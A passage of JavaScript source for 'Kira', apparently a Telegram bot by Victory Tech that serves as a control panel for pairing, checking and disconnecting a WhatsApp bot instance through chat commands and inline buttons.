    `<b>╚════════════════════╝</b>\n\n` +
    `👋 Welcome, <b>${String(firstName).replace(/[<>&]/g, '')}</b>!\n\n` +
    `🚀 <b>Kira</b> is online and ready.\n` +
    `🔗 Telegram × WhatsApp control panel\n` +
    `🧩 Version: <b>2.0.0</b>\n` +
    `🛠 By <b>Victory Tech</b>\n\n` +
    `Choose an option below to continue.`;
  async function sendMainMenu(bot, msg) {
    const options = { caption: mainText(msg.from?.first_name), parse_mode: 'HTML', reply_markup: mainKeyboard };
    try { await bot.sendPhoto(msg.chat.id, telegramImage, options); }
    catch (error) { console.error('Start image failed:', error.message); await bot.sendMessage(msg.chat.id, options.caption, { parse_mode: 'HTML', reply_markup: mainKeyboard }); }
  }
  function initTelegram() {
    if (telegramInitialized) return;
    const token = String(process.env.TELEGRAM_BOT_TOKEN || '').trim();
    if (!token) { console.log('Telegram control disabled: TELEGRAM_BOT_TOKEN is not set.'); return; }
    telegramInitialized = true;
    const TelegramBot = require('node-telegram-bot-api');
    const bot = new TelegramBot(token, { polling: true });
    bot.on('polling_error', error => console.error('Telegram polling error:', error.message));
    bot.onText(/^\/start(?:\s+.*)?$/i, msg => sendMainMenu(bot, msg));
    bot.onText(/^\/status$/i, msg => bot.sendMessage(msg.chat.id, activeConnection?.user ? `✅ <b>Kira WhatsApp is connected</b>\n\n${activeConnection.user.id}` : '⚠️ <b>Kira WhatsApp is not connected.</b>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '↩️ Back', callback_data: 'kira_back' }]] } }));
    bot.onText(/^\/pair(?:\s+(.+))?$/i, async (msg, match) => {
      if (!canControlTelegram(msg)) return bot.sendMessage(msg.chat.id, '⛔ Access denied.');
      const number = String(match?.[1] || '').replace(/\D/g, '');
      if (number.length < 10) return bot.sendMessage(msg.chat.id, 'Usage: <code>/pair 234XXXXXXXXXX</code>', { parse_mode: 'HTML' });
      if (activeConnection?.user) return bot.sendMessage(msg.chat.id, '✅ WhatsApp is already connected.');
      if (pairingPhone) return bot.sendMessage(msg.chat.id, '⏳ A WhatsApp pairing attempt is already in progress.');
      pairingPhone = number;
      pairingNotifier = (code, error) => bot.sendMessage(msg.chat.id, error ? `❌ Pairing failed: ${error.message || error}` : `✅ <b>Your Kira pairing code</b>\n\n<code>${code}</code>\n\nOpen WhatsApp → Linked devices → Link with phone number.`, { parse_mode: 'HTML' });
      await bot.sendMessage(msg.chat.id, '⏳ Starting WhatsApp pairing…');
      try { await connectToWA(); } catch (error) { await bot.sendMessage(msg.chat.id, `❌ Pairing failed: ${error.message}`); pairingPhone = ''; pairingNotifier = null; }
    });
    bot.onText(/^\/disconnect$/i, async msg => {
      if (!canControlTelegram(msg)) return bot.sendMessage(msg.chat.id, '⛔ Access denied.');
      if (!activeConnection) return bot.sendMessage(msg.chat.id, 'ℹ️ WhatsApp is already disconnected.');
      try { activeConnection.end(undefined); activeConnection = null; await bot.sendMessage(msg.chat.id, '✅ WhatsApp disconnected.'); } catch (error) { await bot.sendMessage(msg.chat.id, `❌ Disconnect failed: ${error.message}`); }
    });
    bot.on('callback_query', async query => {
      const chatId = query.message?.chat?.id;
      if (!chatId) return;
      await bot.answerCallbackQuery(query.id).catch(() => {});
      const data = query.data;
      if (data === 'kira_back') return bot.sendMessage(chatId, mainText(query.from?.first_name), { parse_mode: 'HTML', reply_markup: mainKeyboard });
      if (data === 'kira_status') return bot.sendMessage(chatId, activeConnection?.user ? `✅ <b>Kira WhatsApp is connected</b>\n\n${activeConnection.user.id}` : '⚠️ <b>Kira WhatsApp is not connected.</b>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '↩️ Back', callback_data: 'kira_back' }]] } });
      if (data === 'kira_pair') return bot.sendMessage(chatId, '🔗 Send <code>/pair 234XXXXXXXXXX</code> to begin pairing.\n\nFixed code: <code>KIRABOTS</code>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '↩️ Back', callback_data: 'kira_back' }]] } });
      if (data === 'kira_access') return bot.sendMessage(chatId, '🛡 <b>Kira Access</b>\n\nUse the buttons below to control the WhatsApp instance.', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔗 Pair WhatsApp', callback_data: 'kira_pair' }], [{ text: '📡 Status', callback_data: 'kira_status' }], [{ text: '↩️ Back', callback_data: 'kira_back' }]] } });
      if (data === 'kira_owner') { if (!canControlTelegram(query)) return bot.sendMessage(chatId, '⛔ Owner only.'); return bot.sendMessage(chatId, '⚙️ <b>Owner Settings</b>\n\n/pair &lt;number&gt; — pair WhatsApp\n/status — connection status\n/disconnect — disconnect WhatsApp', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '↩️ Back', callback_data: 'kira_back' }]] } }); }
      if (data === 'kira_thanks') return bot.sendMessage(chatId, '❤️ <b>Thanks To</b>\n\nVictory Tech — creator and maintainer of Kira MD.', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '↩️ Back', callback_data: 'kira_back' }]] } });
    });
    console.log('Telegram control initialized for Kira.');
  }
  initTelegram();
